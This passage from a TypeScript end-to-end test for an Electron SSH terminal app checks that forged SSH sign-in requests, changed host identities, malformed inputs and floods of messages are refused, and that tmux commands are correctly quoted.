          // Nothing is written behind his back: the chooser answered with nothing means no file at all.
          const andNot = path.join(os.tmpdir(), `berth-saved-${randomBytes(5).toString('hex')}.txt`);
          ctx.savesTo(() => undefined);
          const useNothing = await stillInUse();
          press(t.view.webContents, 'S', ['control', 'shift']);
          await until(() => ctx.shellState().done === 'Nothing was saved', 5000);
          check('a chooser he answers with nothing writes no file at all, and the window says so', !useNothing || (ctx.shellState().done === 'Nothing was saved' && !(await there(andNot))), [useNothing, ...keysCouldWork(), ctx.shellState().done]);
          // Under a dialog of the window's own the key is not acted on at all, so nothing is handed over.
          const refusedBefore = ctx.saves().refused;
          await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
          await sleep(100);
          const blocked = path.join(os.tmpdir(), `berth-saved-${randomBytes(5).toString('hex')}.txt`);
          ctx.savesTo(() => blocked);
          press(t.view.webContents, 'S', ['control', 'shift']);
          await sleep(400);
          await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
          check('with a dialog over the tab nothing is saved', !(await there(blocked)) && ctx.saves().refused === refusedBefore, [await there(blocked), ctx.saves().refused - refusedBefore]);
          ctx.savesTo(null);
        }
        // And Ctrl+A alone is the shell's: it reaches the box exactly as it always did.
        press(t.view.webContents, 'A', ['control']);
        const plainReached = await until(async () => (await boxGot()).includes('\u0001'), 3000);
        check('Ctrl+A alone is still the shell\u2019s own, and reaches the box', !inUse || plainReached, [inUse, ...keysCouldWork(), plainReached]);
      }
      // A dialog of the window's own is in front: the press is not acted on, it is counted, and no view is
      // given a key that was meant for main.
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
      await sleep(100);
      const refusedBeforeDialog = ctx.keysRefused();
      press(t.view.webContents, 'Tab', ['control']);
      await sleep(250);
      const stayed = ctx.shellState().active === whereItWas;
      const counted = ctx.keysRefused() === refusedBeforeDialog + 1;
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
      check('under a dialog the press moves nothing and is counted, not passed to a view', stayed && counted && (await boxGot()) === '', [stayed, ctx.keysRefused() - refusedBeforeDialog]);
      // And the same press where the focus is the shell's own: the row of tabs, a menu, the status line.
      ctx.win.focus();
      await until(() => ctx.win.isFocused(), 4000);
      press(ctx.shell.webContents, 'Tab', ['control']);
      const shellPressWorked = await until(() => ctx.shellState().active !== whereItWas, 2000);
      check('the same press works when the focus is on the shell and not on a tab', shellPressWorked, [ctx.shellState().active, whereItWas]);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
      await until(() => ctx.shellState().active === t.id, 2000);
      // A size that is none (no cells, absurdly many, not a number) is refused and never reaches the box.
      const droppedBeforeSize = ctx.dropped();
      const askedBefore = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
      await js(t.view, `(window.tabPort.resize(0, 40), window.tabPort.resize(80, 99999), window.tabPort.resize('wide', 24), window.tabPort.resize(80.5, 24))`);
      await sleep(300);
      refusedByTheLock += 4;
      const askedAfter = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
      check('a terminal size that is none is refused, and the box is told nothing', ctx.dropped() === droppedBeforeSize + 4 && askedAfter === askedBefore, [ctx.dropped() - droppedBeforeSize, askedAfter]);
      await lab.tell('quiet off');

      // The key process signs a sign-in for its own box and user, and nothing else, whoever asks.
      const data = signInData('demo', box().publicKey);
      const good = await ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: data.toString('base64') });
      check('a real sign-in for this box is signed, and the signature is this key\'s', 'signature' in good && verifies(box().publicKey, data, good.signature), good);
      const other = await B.add({ name: 'second-box', colour: 3, host: '127.0.0.1', port, user: 'demo', folder: '', places: [] });
      const id2 = other.ok ? other.id : '';
      const passedBefore = ctx.signsPassedOn();
      const refusals: [string, Promise<SignAnswer>][] = [
        ['another box\'s key named through this box\'s tab', ctx.signAs(id, { key: id2, algorithm: 'ssh-ed25519', data: signInData('demo', B.get(id2)!.publicKey).toString('base64') })],
        ['this key asked for through another box\'s tab', ctx.signAs(id2, { key: id, algorithm: 'ssh-ed25519', data: data.toString('base64') })],
        ['a sign-in as another user', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: signInData('root', box().publicKey).toString('base64') })],
        ['a sign-in naming another key', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: signInData('demo', B.get(id2)!.publicKey).toString('base64') })],
        ['a session value of another length', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: signInData('demo', box().publicKey, randomBytes(20)).toString('base64') })],
        ['bytes that are no sign-in', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: randomBytes(96).toString('base64') })],
        ['a sign-in with a byte more', ctx.signAs(id, { key: id, algorithm: 'ssh-ed25519', data: Buffer.concat([data, Buffer.from([0])]).toString('base64') })],
        ['another algorithm', ctx.signAs(id, { key: id, algorithm: 'ssh-rsa', data: data.toString('base64') })],
      ];
      const refused: string[] = [];
      for (const [what, answer] of refusals) if ('signature' in (await answer)) refused.push(what);
      check(`${refusals.length} requests that are not this box's own sign-in are all refused`, refused.length === 0 && ctx.signsRefused() === refusals.length, [refused, ctx.signsRefused()]);
      // Two locks, each seen working: the three that name another key, another box or another algorithm are
      // stopped in main and never reach the key process; the other five are stopped by the key process itself.
      check('three of them never reached the key process; it refused the other five itself', ctx.signsPassedOn() - passedBefore === refusals.length - 3, [ctx.signsPassedOn(), passedBefore]);

      // A second box, checked and pinned, whose key the box does not know: a sign-in failure, nothing more.
      B.reach(id2);
      await until(() => view(id2).step === 'reached', 20_000);
      B.paste(id2, printed);
      await B.trust(id2);
      const t2 = ctx.openTab(id2)!;
      check('a box that does not know our key: sign-in failed, the other tab untouched', (await until(() => t2.engine.link.phase === 'ended', 20_000)) && t2.engine.link.cause === 'sign-in-failed' && t.engine.link.phase === 'up', [t2.engine.link, t.engine.link.phase]);
      ctx.closeTab(t2.id);
      const removed = await B.remove(id2);
      const left = await ctx.keys.request('keys');
      check('removing a box removes its key', removed.ok && !B.get(id2) && Array.isArray(left['keys']) && (left['keys'] as Record<string, unknown>[]).length === 1, [removed, left]);

      // The box at that address becomes another box. The open tab's link ends; a new one is a hard stop.
      const before = t.engine.signAsked;
      const triesBefore = Number((await lab.tell('seen'))['tries']);
      const rekeyed = await lab.tell('rekey');
      const printed2 = String(rekeyed['printed'] ?? '');
      check('the open tab\'s link ended when the box went away, and says how', await until(() => t.engine.link.phase === 'ended' && t.engine.link.cause !== '', 10_000), t.engine.link);
      const t3 = ctx.openTab(id)!;
      const stopped = await until(() => t3.engine.link.phase === 'ended', 20_000);
      const after = await lab.tell('seen');
      check('a box showing another identity is a hard stop: said with what it showed, no key used, no sign-in tried', stopped && t3.engine.link.cause === 'identity-changed' && t3.engine.link.endedIn === 'key-exchange' && t3.engine.link.shownFingerprint !== '' && printed2.includes(t3.engine.link.shownFingerprint) && !printed.includes(t3.engine.link.shownFingerprint) && t3.engine.signAsked === 0 && t.engine.signAsked === before && Number(after['tries']) === 0 && triesBefore >= 1, [t3.engine.link, t3.engine.signAsked, after['tries'], triesBefore]);
      check('and the pin is unchanged', printed.includes(box().pinFingerprint), box().pinFingerprint);
      ctx.closeTab(t3.id);

      // ---- Edit box: what main checks itself, whatever a dialog may or may not have checked first. ----
      const asItWas = { name: box().name, colour: box().colour, host: box().host, port: String(box().port), user: box().user, folder: box().folder, places: box().places.map((p) => ({ name: p.name, folder: p.folder })) };
      const neighbour = await B.add({ name: 'other-box', colour: 4, host: '127.0.0.1', port, user: 'demo', folder: '', places: [] });
      const takenName = await B.edit(id, { ...asItWas, name: 'other-box' });
      check('a name another box already has is refused by main, by field, and nothing is saved', neighbour.ok && !takenName.ok && takenName.error === 'fields' && (takenName.fields ?? {})['name'] === 'another box has this name' && box().name === 'lab-box', [neighbour, takenName, box().name]);
      const sameName = await B.edit(id, { ...asItWas, folder: '/srv/ledger' });
      check('a box keeping its own name is not called taken: it is itself', sameName.ok && box().folder === '/srv/ledger' && box().name === 'lab-box', [sameName, box().folder]);
      const badField = await B.edit(id, { ...asItWas, port: '70000' });
      check('a field that is not right is refused by main, by field', !badField.ok && badField.error === 'fields' && !!(badField.fields ?? {})['port'] && box().port !== 70000, badField);
      // The user: the key is bound to one user on one box, so the key process is told anew.
      const movedUser = await B.edit(id, { ...asItWas, user: 'someone-else' });
      const keysNow = await ctx.keys.request('keys');
      const bound = (keysNow['keys'] as Record<string, unknown>[] | undefined)?.find((k) => k['box'] === id);
      check('changing the box\'s user binds its key to that user, and the key itself is the same', movedUser.ok && box().user === 'someone-else' && bound?.['user'] === 'someone-else' && bound?.['publicKey'] === box().publicKey, [movedUser, bound]);
      await B.edit(id, { ...asItWas, user: 'demo' });
      // The address: an address that changed may be another machine, so the identity pinned for the old one goes.
      const pinWas = box().pinFingerprint;
      const movedAddr = await B.edit(id, { ...asItWas, host: '127.0.0.2' });
      check('changing the address forgets the identity pinned for the old one: the box must be checked again', movedAddr.ok && box().host === '127.0.0.2' && box().pin === '' && box().pinFingerprint === '' && ctx.openTab(id) === null, [movedAddr, box().pin, box().pinFingerprint]);
      // Put it back and pin it again, so the rest of this run has its box.
      await B.edit(id, asItWas);
      B.reach(id);
      await until(() => B.check(id).step === 'reached', 20_000);
      B.paste(id, printed2); // the box was rebuilt a moment ago: these are the lines it prints now
      const pinnedAgain = await B.trust(id);
      check('checked again at its own address, it is pinned again, to the identity it shows now', pinnedAgain.ok && box().pin !== '' && printed2.includes(box().pinFingerprint) && box().pinFingerprint !== pinWas, [pinnedAgain, box().pinFingerprint]);
      // Forget it, on purpose: the identity goes and nothing else does.
      const keyWas = box().publicKey;
      const forgot = await B.forget(id);
      check('forgetting an identity leaves the box and its key exactly as they were', forgot.ok && box().pin === '' && box().publicKey === keyWas && box().name === 'lab-box' && ctx.openTab(id) === null, [forgot, box().publicKey === keyWas]);
      const forgotAgain = await B.forget(id);
      check('forgetting one that is already forgotten changes nothing and is not an error', forgotAgain.ok && box().pin === '', forgotAgain);
      // A box that is not there cannot be edited, forgotten or deleted.
      const noBox = await Promise.all([B.edit('bno-such-box', asItWas), B.forget('bno-such-box'), B.remove('bno-such-box')]);
      check('a box that is not there cannot be edited, forgotten or deleted', noBox.every((r) => !r.ok && r.error === 'no such box'), noBox);
      await B.remove(neighbour.ok ? neighbour.id : '');
      // Pinned once more, so what this run leaves on disk is a box as it should be: the next start reads it.
      B.reach(id);
      await until(() => B.check(id).step === 'reached', 20_000);
      B.paste(id, printed2);
      const pinnedLast = await B.trust(id);
      check('and after all of that the box is left as a box should be: named, keyed and pinned', pinnedLast.ok && box().name === 'lab-box' && box().publicKey !== '' && box().pin !== '', [pinnedLast, box().name, box().pin !== '']);

      // ---- A place that keeps running: tmux (step 7, plan B2.5 line 2). ----
      {
        const asIs = { name: box().name, colour: box().colour, host: box().host, port: String(box().port), user: box().user, folder: box().folder, places: box().places.map((p) => (p.tmux === true ? { name: p.name, folder: p.folder, tmux: true } : { name: p.name, folder: p.folder })) };
        // A name tmux would not leave alone is refused by main, by field, and nothing is saved: tmux gives
        // . and : a meaning inside a name, so a place marked this way is held to what it leaves alone.
        const badName = await B.edit(id, { ...asIs, places: [...asIs.places, { name: 'a.b c', folder: '/var/log', tmux: true }] });
        check('a keeps-running place whose name is not one tmux leaves alone is refused, by field', !badName.ok && badName.error === 'fields' && JSON.stringify(badName.fields ?? {}).includes('keeps-running name') && box().places.length === asIs.places.length, badName);
        // The same name without the tick is a plain place and is taken: the rule belongs to the tick.
        const plainOk = await B.edit(id, { ...asIs, places: [...asIs.places, { name: 'a.b c', folder: '/var/log' }] });
        check('and the same name without the tick is an ordinary place, taken as it always was', plainOk.ok && box().places.some((p) => p.name === 'a.b c' && p.tmux !== true), plainOk);
        const withKeep = await B.edit(id, { ...asIs, places: [...asIs.places, { name: 'build', folder: "/var/log/it's here", tmux: true }] });
        check('a keeps-running place is saved with its mark, and a plain place carries none at all', withKeep.ok && box().places.find((p) => p.name === 'build')?.tmux === true && box().places.find((p) => p.name === 'logs')?.tmux === undefined, [withKeep, JSON.stringify(box().places)]);
        const before = ((await lab.tell('seen'))['sessions'] ?? []) as { Command?: string }[];
        const keeping = ctx.openTab(id, 'build');
        check('a keeps-running place opens a tab', keeping !== null, '');
        if (keeping) {
          await until(async () => (((await lab.tell('seen'))['sessions'] ?? []) as unknown[]).length > before.length, 20_000);
          const now = ((await lab.tell('seen'))['sessions'] ?? []) as { Command?: string }[];
          const asked = now.slice(before.length).map((x) => x.Command ?? '').find((c) => c !== '');
          // The session is asked after before the cd, so a place whose folder has gone is still reached:
          // the cd is on the way to making a session, not on the way to one that is already there.
          const want = `tmux -L berth -f /dev/null has-session -t 'build' 2>/dev/null || cd -- '/var/log/it'\\''s here' || exit 2; exec tmux -L berth -f /dev/null set -g mouse on \\; new-session -A -s 'build'`;
          check('and the box is asked for this app\u2019s own tmux server and the place\u2019s session, and nothing else', asked === want, [asked, want]);
          // One session on the box is one tab here: opening it again would attach the same tmux session to
          // two tabs, which tmux then draws at the smaller of the two sizes and types into both at once.
          const twice = ctx.openTab(id, 'build');
          check('a keeps-running place opened again opens no second tab, and the window says why', twice === null && ctx.shellState().done.includes('already open'), [twice === null, ctx.shellState().done]);
          // A plain place of the same box is untouched by any of it.
          const plainAgain = ctx.openTab(id, 'logs');
          check('a plain place of the same box still opens as it always did', plainAgain !== null, '');
          if (plainAgain) ctx.closeTab(plainAgain.id);
          ctx.closeTab(keeping.id);
        }
        await B.edit(id, asIs);
        check('the box is left as it was before any of this', box().places.length === asIs.places.length && box().places.every((p) => p.tmux === undefined), JSON.stringify(box().places));
      }

      ctx.closeTab(t.id);

      // The morning itself. With nothing open and a box pinned, the window is in the state a fresh start
      // leaves it in; what was open last time is put back the way the app's own close writes it, because a
      // run of the lab is one start of the app and there is no second morning inside it.
      {
        // While anything is open at all there is no offer, whatever was written down: the morning is over
        // the moment he has a tab in front of him, and an offer then would be in the way.
        {
          // A tab is opened for this on purpose: a probe that only runs when something happens to be open
          // is a probe that can quietly never run at all.
          const one = [...ctx.tabs.values()].find((t) => t.box) ?? ctx.openTab(id, '');
          await until(() => ctx.tabs.size > 0, 10_000);
          await ctx.boxes.setLastTabs([{ box: id, place: '' }]);
          await sleep(250);
          check('with something open there is no offer, whatever was written down', !!one && ctx.shellState().reopen.length === 0 && !(await has('#reopen')), [ctx.shellState().reopen, ctx.boxes.lastTabs, ctx.tabs.size]);
        }
        // Nothing open at all: that is the state a fresh start is in, and the offer exists only in it.
        // Closing every tab also empties what the morning would offer, which is right: he closed them.
        for (const open of [...ctx.tabs.values()]) ctx.closeTab(open.id);
        await until(() => ctx.tabs.size === 0, 5000);
        const emptied = await until(() => ctx.boxes.lastTabs.length === 0, 15_000);
        check('closing every tab leaves the morning nothing to offer, because he closed them', emptied && ctx.shellState().reopen.length === 0, [ctx.boxes.lastTabs, ctx.shellState().reopen]);
        // The place is taken from the box as it now stands: the probes before this one have edited it, and a
        // place this box no longer has is one the offer is right to leave out.
        const place = box().places[0]?.name ?? '';
        const wrote = await B.setLastTabs([{ box: id, place }, { box: id, place: '' }]);
        await until(async () => (await has('#reopen')), 5000);
        const rows = await js<string>(ctx.shell, `[...document.querySelectorAll('#reopen [data-reopen]')].map((e) => e.textContent).join(' | ')`);
        const drawn = await js<string>(ctx.shell, `(document.getElementById('first-use')?.outerHTML ?? 'no first-use').slice(0, 200)`);
        check('with nothing open, the window offers what was open last time, each with a tick', (await has('#reopen')) && rows.includes('lab-box') && (place === '' || rows.includes(place)) && rows.includes('its starting folder'), [rows, drawn, place, ctx.tabs.size]);
        // One tick taken off, and only the rest open.
        await js(ctx.shell, `document.querySelector('#reopen [data-reopen="1"] input')?.click()`);
        await sleep(120);
        const says = await js<string>(ctx.shell, `document.getElementById('reopen-go')?.textContent ?? ''`);
        await clickOn('#reopen-go');
        const opened = await until(() => ctx.tabs.size === 1, 20_000);
        const only = [...ctx.tabs.values()][0];
        check('only the ones he left ticked are opened, each on its own box and place', opened && says.includes('Open 1') && only?.box?.id === id && only?.place === place, [ctx.tabs.size, says, only?.place, place]);
        check('and the offer is gone once it has been answered', !(await has('#reopen')), '');
        if (only) ctx.closeTab(only.id);
        // Put away instead: nothing opens, and what was open is forgotten rather than offered again.
        await B.setLastTabs([{ box: id, place }]);
        await until(async () => (await has('#reopen')), 5000);
        await clickOn('#reopen-not-now');
        await sleep(400);
        check('Not now opens nothing, and what was open is forgotten', ctx.tabs.size === 0 && !(await has('#reopen')) && ctx.boxes.lastTabs.length === 0, [ctx.tabs.size, ctx.boxes.lastTabs]);
        // A made-up number is not a tab: nothing opens and nothing is drawn from it.
        await B.setLastTabs([{ box: id, place }]);
        await js(ctx.shell, `window.shellPort.cmd({ op: 'reopen', which: [5, -1, 0.5, 'x'] })`);
        await sleep(500);
        check('a number that is not one of the lines offered opens nothing', ctx.tabs.size === 0, ctx.tabs.size);
        await B.setLastTabs([]);
      }
      lab.end();
      // With the app closed the PC holds one locked file: no box's name is readable in anything the app wrote.
      const named = [...(await filesHolding('lab-box')), ...(await filesHolding('second-box')), ...(await filesHolding('/var/log/it'))];
      check('no file the app wrote names a box or a place in the clear', named.length === 0, named);

    }

    check('no view ever reached the canary web server', canaryHits === 0, canaryHits);
    check(`no message was dropped, but the ones refused on purpose (late from a closed view, not acted on: ${ctx.lateFromClosed()})`, ctx.dropped() === refusedByTheLock, [ctx.dropped(), refusedByTheLock, ctx.droppedOn()]);
    // The local log, over the whole run: every failure in it is one the app wrote itself, a view's flood
    // cannot become the log, and nothing it holds was lost.
    {
      const log = await ctx.faults();
      const text = await readFile(log.file, 'utf8').catch(() => '');
      const lines = text.split('\n').filter((l) => l.trim() !== '');
      // The flood is made here rather than hoped for: sixty asks a view may not make, in one go, so the cap
      // is proved in every mode of the run and not only in the long one.
      const droppedBefore = ctx.dropped();
      await js(ctx.shell, `for (let i = 0; i < 60; i++) window.shellPort.cmd({ op: 'nothing-of-the-sort' })`);
      await until(async () => ctx.dropped() >= droppedBefore + 60, 5000);
      const log2 = await ctx.faults();
      const text2 = await readFile(log2.file, 'utf8').catch(() => '');
      const drops = text2.split('\n').filter((l) => l.includes(' dropped ')).length;
      const ids = new Set(lines.map((l) => l.split(' ')[1]));
      const shaped = lines.every((l) => /^\d{4}-\d{2}-\d{2}T[\d:.]+Z [A-HJ-NP-Z2-9]{6} \S+ /.test(l));
      check(
        'every line of the log is one line, shaped the same, with an id of its own',
        lines.length > 0 && shaped && ids.size === lines.length && log.lost === 0,
        [lines.length, ids.size, shaped, log.lost, lines.at(-1)],
      );
      // A promise broken on his own PC is written down. The first promise of this app is that the window
      // always answers, and one that is broken only in a number nobody reads is one nobody can hold it to.
      {
        const slow = [...ctx.tabs.values()].find((t) => t.box) ?? [...ctx.tabs.values()][0];
        if (slow) {
          await js(slow.view, `window.tabPort.meter({ longTaskMs: 4000, reactionMs: 0, reactionKind: 0, reactionWaitMs: 0, reactionHandlerMs: 0 })`);
          const wrote = await until(async () => (await ctx.faults()).lately.some((l) => l.what === 'meter'), 5000);
          const log3 = await ctx.faults();
          const text3 = await readFile(log3.file, 'utf8').catch(() => '');
          const said = text3.split('\n').filter((l) => l.includes(' meter ')).at(-1) ?? '';
          check('a promise broken on his own PC is written in the local log, with what it was and what it should have been', wrote && said.includes('viewTaskMs') && said.includes('4000 ms') && said.includes('budget'), said);
        }
      }
      check(
        'a view that floods main with asks it may not make cannot flood the log: the first few are written, the rest counted',
        ctx.dropped() >= droppedBefore + 60 && drops > 0 && drops <= 20,
        [ctx.dropped() - droppedBefore, drops, log2.lost],
      );
      const big = await stat(log.file).catch(() => null);
      check('the log cannot fill a disk: it is inside its own size', !!big && big.size <= 1024 * 1024, big?.size ?? -1);
    }
  } catch (err) {
    check('no probe threw', false, err instanceof Error ? (err.stack ?? err.message) : String(err));
  }

  canary.close();
  clearTimeout(guard);
  finish(results.every((r) => r.ok) ? 0 : 1);
}
